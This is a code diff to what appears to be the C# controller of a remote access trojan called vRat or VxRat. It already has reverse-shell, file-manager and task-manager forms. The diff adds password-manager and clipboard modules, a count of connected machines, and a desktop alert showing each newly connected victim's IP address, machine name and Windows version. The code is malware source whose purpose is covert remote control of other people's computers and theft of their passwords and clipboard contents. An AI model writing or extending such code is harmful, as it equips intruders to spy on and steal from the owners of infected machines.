@@ -6,6 +6,7 @@ using System.Net.Http;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 using vRatServer.Forms;
 
@@ -23,6 +24,10 @@ namespace vRatServer.Classes
         public ReverseShellform rsf = null;
         public FileManagerForm fmf = null;
         public TaskManager tkm = null;
+        public Forms.Clipboard clpd = null;
+        public PasswordManager pam = null;
+        public OnDisconnect ondsc = null;
+
         public List<string> screens;
         public int ScreenX;
         public int ScreenY;
@@ -31,6 +36,7 @@ namespace vRatServer.Classes
         public string ip { get; set; }
         public Socket client { get; set; }
         public ListViewItem lvi;
+        public List<ListViewItem> testfileslist=new List<ListViewItem>();
 
         void GetCountry()
         {
@@ -81,12 +87,24 @@ namespace vRatServer.Classes
             //lvi.ImageKey = ip;
 
             Program.f1.Invoke((MethodInvoker)delegate {
-                Program.f1.listView1.SmallImageList = globals.imageList;
+                Program.f1.updateCount(true);
+            Program.f1.listView1.SmallImageList = globals.imageList;
 
+            Program.f1.n.Icon = SystemIcons.Information;
+            Program.f1.n.Visible = true;
+                Program.f1.n.BalloonTipTitle = "VxRat";
+                Program.f1.n.ShowBalloonTip(3000, ip, Name+"\n"+ WindowsVers, ToolTipIcon.Info);
+                Task.Delay(4000).ContinueWith(_ => Program.f1.n.Visible = false);
                 Program.f1.listView1.Items.Add(lvi);
 
             });
         }
+
+        private void N_DoubleClick(object sender, EventArgs e)
+        {
+            throw new NotImplementedException();
+        }
+
         public Client(Socket s)
         {
             SocketM = new Mutex();
@@ -139,7 +157,7 @@ namespace vRatServer.Classes
                         
 
                         new ClientPacket(id, com[0], ref data_buffer, len, this).packetHandler();
-                        GC.Collect();
+                        //GC.Collect();
 
 
                     }
@@ -156,11 +174,12 @@ namespace vRatServer.Classes
         }
         private void Disconnected()
         {
-            
+
             Program.f1.Invoke((MethodInvoker)delegate {
                 try
                 {
                     lvi.Remove();
+                    Program.f1.updateCount(false);
                 }
                 catch (Exception) { }
                 
